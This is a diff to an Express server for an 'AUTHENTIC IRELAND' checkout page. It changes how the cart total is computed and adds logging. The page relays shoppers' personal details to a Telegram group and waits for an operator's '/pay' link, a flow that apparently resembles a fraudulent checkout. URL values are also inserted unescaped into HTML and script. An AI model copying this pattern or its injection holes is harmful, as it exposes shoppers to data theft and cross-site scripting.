@@ -53,45 +53,68 @@ async function sendTelegramMessage(text) {
 app.get('/checkout', async (req, res) => {
   const { amount, currency, order_id, return_url, cart_items } = req.query;
   
-  if (!amount || !currency) {
-    return res.status(400).send('Missing required parameters');
+  console.log('=== CHECKOUT REQUEST ===');
+  console.log('Amount from URL:', amount);
+  console.log('Cart items from URL:', cart_items);
+  
+  if (!currency) {
+    return res.status(400).send('Missing currency parameter');
   }
 
   let cartData = null;
-  let calculatedTotal = parseFloat(amount) || 0;
+  let finalAmount = '0.00';
+  let cartItemsHtml = '';
   
+  // Parse cart data
   if (cart_items) {
     try {
       cartData = JSON.parse(decodeURIComponent(cart_items));
+      console.log('Parsed cart data:', cartData);
       
-      // Calculate total from cart items if available
-      if (cartData && cartData.items && cartData.items.length > 0) {
-        calculatedTotal = cartData.items.reduce((sum, item) => {
-          return sum + ((item.price / 100) * item.quantity);
+      // Calculate from cart.total (most reliable)
+      if (cartData.total) {
+        finalAmount = (cartData.total / 100).toFixed(2);
+        console.log('Total from cart.total:', finalAmount);
+      }
+      // Fallback: calculate from items
+      else if (cartData.items && cartData.items.length > 0) {
+        const calculatedTotal = cartData.items.reduce((sum, item) => {
+          const itemTotal = item.line_price || (item.price * item.quantity);
+          return sum + itemTotal;
         }, 0);
-      } else if (cartData && cartData.total) {
-        calculatedTotal = cartData.total / 100;
+        finalAmount = (calculatedTotal / 100).toFixed(2);
+        console.log('Total calculated from items:', finalAmount);
+      }
+      
+      // Build product list HTML
+      if (cartData.items && cartData.items.length > 0) {
+        cartItemsHtml = cartData.items.map(item => {
+          const linePrice = item.line_price ? (item.line_price / 100).toFixed(2) : ((item.price * item.quantity) / 100).toFixed(2);
+          return `
+            <div class="product-summary">
+              <div class="product-info">
+                <span class="product-quantity">${item.quantity}</span>
+                <span class="product-title">${item.title}</span>
+              </div>
+              <span class="product-price">€${linePrice}</span>
+            </div>
+          `;
+        }).join('');
       }
     } catch (e) {
       console.error('Error parsing cart_items:', e);
     }
   }
+  
+  // Fallback to URL amount if cart parsing failed
+  if (finalAmount === '0.00' && amount) {
+    finalAmount = parseFloat(amount).toFixed(2);
+    console.log('Using URL amount as fallback:', finalAmount);
+  }
+  
+  console.log('FINAL AMOUNT:', finalAmount);
 
   const sessionId = Date.now().toString();
-
-  // Build cart items HTML
-  let cartItemsHtml = '';
-  if (cartData && cartData.items) {
-    cartItemsHtml = cartData.items.map(item => `
-      <div class="product-summary">
-        <div class="product-info">
-          <span class="product-quantity">${item.quantity}</span>
-          <span class="product-title">${item.title}</span>
-        </div>
-        <span class="product-price">€${((item.price / 100) * item.quantity).toFixed(2)}</span>
-      </div>
-    `).join('');
-  }
 
   res.send(`
     <!DOCTYPE html>
@@ -134,7 +157,6 @@ app.get('/checkout', async (req, res) => {
             }
           }
           
-          /* Left side - Form */
           .checkout-form {
             padding: 60px 80px;
             background: white;
@@ -266,7 +288,6 @@ app.get('/checkout', async (req, res) => {
             cursor: not-allowed;
           }
           
-          /* Right side - Order Summary */
           .order-summary {
             padding: 60px 80px;
             background: #fafafa;
@@ -374,7 +395,6 @@ app.get('/checkout', async (req, res) => {
       </head>
       <body>
         <div class="container">
-          <!-- Left side - Form -->
           <div class="checkout-form">
             <div id="form-container">
               <div class="logo">AUTHENTIC IRELAND</div>
@@ -503,18 +523,17 @@ app.get('/checkout', async (req, res) => {
             </div>
           </div>
           
-          <!-- Right side - Order Summary -->
           <div class="order-summary">
             <h2 style="font-size: 18px; font-weight: 600; margin-bottom: 24px;">Order summary</h2>
             
             <div class="products">
-              ${cartItemsHtml || '<p style="color: #6d7175; font-size: 14px;">No items in cart</p>'}
+              ${cartItemsHtml || '<p style="color: #6d7175; font-size: 14px;">Loading cart items...</p>'}
             </div>
             
             <div style="margin-top: 24px;">
               <div class="summary-line">
                 <span style="color: #6d7175;">Subtotal</span>
-                <span>€${calculatedTotal.toFixed(2)}</span>
+                <span>€${finalAmount}</span>
               </div>
               <div class="summary-line">
                 <span style="color: #6d7175;">Shipping</span>
@@ -522,7 +541,7 @@ app.get('/checkout', async (req, res) => {
               </div>
               <div class="summary-line total">
                 <span>Total</span>
-                <span style="font-size: 24px;">€${calculatedTotal.toFixed(2)}</span>
+                <span style="font-size: 24px;">€${finalAmount}</span>
               </div>
             </div>
           </div>
@@ -531,7 +550,10 @@ app.get('/checkout', async (req, res) => {
         <script>
           const cartData = ${cartData ? JSON.stringify(cartData) : 'null'};
           const sessionId = '${sessionId}';
+          const finalAmount = '${finalAmount}';
           let pollingInterval = null;
+
+          console.log('Page loaded with amount:', finalAmount);
 
           document.getElementById('customer-form').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -547,7 +569,6 @@ app.get('/checkout', async (req, res) => {
               country: document.getElementById('country').value.trim()
             };
             
-            // Validate
             if (!customerData.firstName || !customerData.lastName || !customerData.email || 
                 !customerData.phone || !customerData.address || !customerData.postalCode || 
                 !customerData.city || !customerData.country) {
@@ -556,12 +577,10 @@ app.get('/checkout', async (req, res) => {
               return;
             }
 
-            // Show waiting screen
             document.getElementById('form-container').style.display = 'none';
             document.getElementById('waiting-container').style.display = 'block';
             
             try {
-              // Send customer data
               const response = await fetch('/api/submit-customer-info', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -569,7 +588,7 @@ app.get('/checkout', async (req, res) => {
                   sessionId: sessionId,
                   customerData: customerData,
                   cartData: cartData,
-                  amount: '${calculatedTotal.toFixed(2)}',
+                  amount: finalAmount,
                   currency: '${currency}',
                   orderId: '${order_id || ''}',
                   returnUrl: '${return_url || ''}'
@@ -579,7 +598,6 @@ app.get('/checkout', async (req, res) => {
               const data = await response.json();
               
               if (data.status === 'success') {
-                // Start polling for payment link
                 startPolling();
               } else {
                 throw new Error(data.message || 'Something went wrong');
@@ -593,7 +611,6 @@ app.get('/checkout', async (req, res) => {
           });
 
           function startPolling() {
-            // Poll every 2 seconds for payment link
             pollingInterval = setInterval(async () => {
               try {
                 const response = await fetch('/api/check-payment-link/' + sessionId);
@@ -608,7 +625,6 @@ app.get('/checkout', async (req, res) => {
               }
             }, 2000);
 
-            // Stop polling after 10 minutes
             setTimeout(() => {
               if (pollingInterval) {
                 clearInterval(pollingInterval);
@@ -628,9 +644,10 @@ app.post('/api/submit-customer-info', async (req, res) => {
   try {
     const { sessionId, customerData, cartData, amount, currency, orderId, returnUrl } = req.body;
     
-    console.log('Customer info received:', customerData);
+    console.log('=== CUSTOMER INFO SUBMITTED ===');
+    console.log('Amount:', amount);
+    console.log('Customer:', customerData);
     
-    // Store session
     pendingSessions.set(sessionId, {
       customerData,
       cartData,
@@ -642,16 +659,15 @@ app.post('/api/submit-customer-info', async (req, res) => {
       created_at: new Date()
     });
     
-    // Build products list
     let productsText = '';
     if (cartData && cartData.items) {
       productsText = '\n\n<b>🛒 Products:</b>\n';
       cartData.items.forEach(item => {
-        productsText += `• ${item.quantity}x ${item.title} - €${(item.price / 100).toFixed(2)}\n`;
+        const linePrice = item.line_price ? (item.line_price / 100).toFixed(2) : ((item.price * item.quantity) / 100).toFixed(2);
+        productsText += `• ${item.quantity}x ${item.title} - €${linePrice}\n`;
       });
     }
     
-    // Send to Telegram GROUP
     const message = `
 <b>🔔 NEW ORDER - AUTHENTIC IRELAND</b>
 
@@ -692,7 +708,7 @@ Example:
   }
 });
 
-// Check payment link (polling endpoint)
+// Check payment link
 app.get('/api/check-payment-link/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   const session = pendingSessions.get(sessionId);
@@ -717,11 +733,9 @@ app.post('/webhook/telegram', async (req, res) => {
     const update = req.body;
     console.log('Telegram update:', JSON.stringify(update, null, 2));
     
-    // Handle text messages
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
       
-      // Check if it's a /pay command
       if (text.startsWith('/pay ')) {
         const parts = text.split(' ');
         
@@ -732,7 +746,6 @@ app.post('/webhook/telegram', async (req, res) => {
           const session = pendingSessions.get(sessionId);
           
           if (session) {
-            // Store payment link
             session.paymentLink = paymentLink;
             pendingSessions.set(sessionId, session);
             
